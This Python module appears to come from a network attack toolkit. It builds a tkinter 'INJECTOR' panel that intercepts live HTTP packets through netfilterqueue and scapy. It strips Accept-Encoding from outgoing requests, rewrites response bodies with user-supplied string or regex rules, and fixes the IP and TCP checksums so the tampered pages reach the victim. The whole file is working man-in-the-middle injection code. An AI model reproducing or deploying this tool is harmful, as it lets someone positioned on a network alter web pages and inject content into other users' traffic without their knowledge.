import re
import threading
from tkinter import Listbox

import netfilterqueue
from tkinter.ttk import *

from netfilterqueue import COPY_PACKET

from Injector.capture import rules
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw, Packet

from Injector.ruler import Delete_rule, Add_rule
from utils.debug import dbg, INFO, SUCCESS, ERROR

# rules = {}


# @Frame
def Injector(master=None):
    injector_frame = LabelFrame(master, text="INJECTOR")

    add_new = Entry(injector_frame, justify="center")
    add_new.pack(side='top', fill='x')


    rules_list = Listbox(injector_frame, takefocus=False, justify="center", selectmode="single", exportselection=True, highlightbackground="gray", activestyle="underline")
    add_new.bind("<Return>", lambda a:Add_rule(rules_list=rules_list, rule=add_new.get()))

    rules_list.pack(fill="both", expand=True)
    rules_list.bind("<BackSpace>", lambda a: Delete_rule(List=rules_list))
    rules_list.bind("<Delete>", lambda a: Delete_rule(List=rules_list))
    def Edit():
        if rules_list.curselection():
            try:
                sel = rules_list.curselection()[0] # selected
                rule = rules_list.get(first=sel, last=sel)[0]
                if rule in list(rules.keys()):
                    k = rules[rule]['repl'] # replace
                    v = rules[rule]['to']
                    r = rules[rule]['regex']
                    # Add here acts as an editor object.

                    Add_rule(edit=True, rules_list=rules_list, rule=rule, rule_key=k, rule_value=v, Regex=r)
            except Exception:
                pass
    rules_list.bind("<Double-Button-1>", lambda a:Edit())

    def manipulate(packet: Packet, load):  # manipulate load
        """
        :param packet: scapy packet
        :param load: new html code to set as a new raw load
        :return:
        """
        packet[Raw].load = load
        del packet[IP].len
        del packet[IP].chksum
        del packet[TCP].chksum
        return packet

    def process_packet(packet: netfilterqueue.Packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(Raw):
            if scapy_packet.haslayer(TCP):
                if scapy_packet[TCP].dport == 80:  # request
                    modified_load = re.sub(b"[A|a]ccept-[E|e]ncoding:.*?\\r\\n", b"", scapy_packet[Raw].load)
                    new_packet = manipulate(packet=scapy_packet, load=modified_load)
                    packet.set_payload(bytes(new_packet))
                elif scapy_packet[TCP].sport == 80:  # response
                    modified_load = scapy_packet[Raw].load
                    for rule in rules:
                        replace_from = rules[rule]['repl'].encode(errors="replace")
                        replace_to = rules[rule]['to'].encode(errors="replace")
                        regex = rules[rule]['regex']

                        if regex:
                            modified_load = re.sub(replace_from, replace_to, modified_load)
                        else:
                            modified_load = modified_load.replace(replace_from, replace_to)

                    new_packet = manipulate(packet=scapy_packet, load=modified_load)
                    packet.set_payload(bytes(new_packet))
        packet.accept()
        print(rules)

    queue = netfilterqueue.NetfilterQueue()

    def RUN():
        print(rules)
        if len(rules) > 0:
            try:
                queue.bind(queue_num=0, user_callback=process_packet, mode=COPY_PACKET)
                dbg("Starting injector..", INFO)
                threading.Thread(target=queue.run, ).start()
                dbg("Injector started!", SUCCESS)
                start.config(state='disabled', cursor='')
            except Exception as error:
                dbg(error, ERROR)

    start = Button(injector_frame, text="start", command=lambda :RUN())
    start.pack(side='bottom', fill='x')

    return injector_frame